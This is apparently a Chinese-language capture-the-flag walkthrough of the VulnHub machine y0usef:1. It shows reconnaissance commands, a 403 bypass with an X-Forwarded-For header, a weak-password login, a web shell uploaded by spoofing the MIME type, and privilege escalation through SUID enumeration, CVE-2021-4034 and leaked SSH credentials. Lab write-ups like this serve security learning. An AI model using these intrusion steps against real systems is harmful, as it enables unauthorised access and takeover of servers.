靶机地址：[y0usef: 1 ~ VulnHub](https://www.vulnhub.com/entry/y0usef-1,624/)
主机发现、端口扫描、服务枚举
```Shell
sudo arp-scan -l
sudo nmap -p- 192.168.1.36
sudo nmap -p22,80 -sV 192.168.1.36
# 22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
# 80/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
```
访问Web服务，没发现什么特别的地方
指纹收集
```Shell
whatweb http://192.168.1.36
# http://192.168.1.36 [200 OK] Apache[2.4.10], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.10 (Ubuntu)], IP[192.168.1.36], JQuery, PHP[5.5.9-1ubuntu4.29], Script, X-Powered-By[PHP/5.5.9-1ubuntu4.29]
```
web路径扫描
```Shell
sudo dirsearch -u http://192.168.1.36
# /adminstration
sudo dirsearch -u http://192.168.1.36/adminstration/
# /adminstration/include/
# /adminstration/logout
# /adminstration/upload
# /adminstration/users

sudo feroxbuster --url http://192.168.1.36
gobuster dir -u http://192.168.1.36 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x php,jsp,html,js,txt
# 这俩啥都扫不出来
```
访问 `/adminstration` ，响应403，需要尝试ByPass。
最终发现添加标头： `X-Forwarded-For: 127.0.0.1` ，可以绕过403
```Shell
source env/bin/activate
python3 403bypasser.py -u http://192.168.1.36 -d adminstration
cat 192.168.1.36.txt | grep -C 1 "STATUS: 200"
```
是一个登录页面，使用弱口令 `admin : admin` 成功登录
简单观察，发现有上传文件的功能，上传一个木马，返回file not allow。
尝试绕过，先试试修改Mime-Type，改为
```
Content-Type: image/png
```
返回信息变成了
```
file uploadad files/1669727639one.php
```
看起来是上传成功了
尝试访问
```
http://192.168.1.36/adminstration/upload/files/1669727639one.php
```
成功访问到了，再用蚁剑连一下试试
OK没问题
接下来是提权
```Shell
# 查看是否有密码文件编辑权限
ls -l /etc/passwd
# 没有编辑权限

# 用户枚举
cat /etc/passwd | grep /bin/bash
# 3个可能可以利用的用户
# root:x:0:0:root:/root:/bin/bash
# yousef:x:1000:1000:yousef,,,:/home/yousef:/bin/bash
# guest-cpxNn2:x:116:125:Guest,,,:/tmp/guest-cpxNn2:/bin/bash

sudo -l
# sudo用不了
crontab -l
# 没有定时任务
/sbin/getcap -r / 2>/dev/null
# 没有可以利用的特权程序

find / -perm -u=s -type f -user root -executable ! -group root 2>/dev/null -exec ls -l {} \;
# 找到一个或许可用的SUID文件 仔细看看好像不太能利用
# -rwsr-xr-x 1 root lpadmin 13672 Apr 10  2014 /usr/bin/lppasswd

uname -a
# Linux yousef-VirtualBox 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:08:14 UTC 2014 i686 athlon i686 GNU/Linux
which gcc
# /usr/bin/gcc
```
尝试内核漏洞提权，使用 [[20 CVE#CVE-2021-4034|CVE-2021-4034]]
```Shell
dpkg -l policykit-1
# 0.105-4ubunt
```
成功提权

尝试别的提权方式
```Shell
ls -l /home/
cat /home/user.txt
# c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=
```
解码后为
```
ssh : .user : yousef .pass : yousef123
```
尝试SSH，成功了
```Shell
sudo -l
su su
```
有密码可以直接本地提权
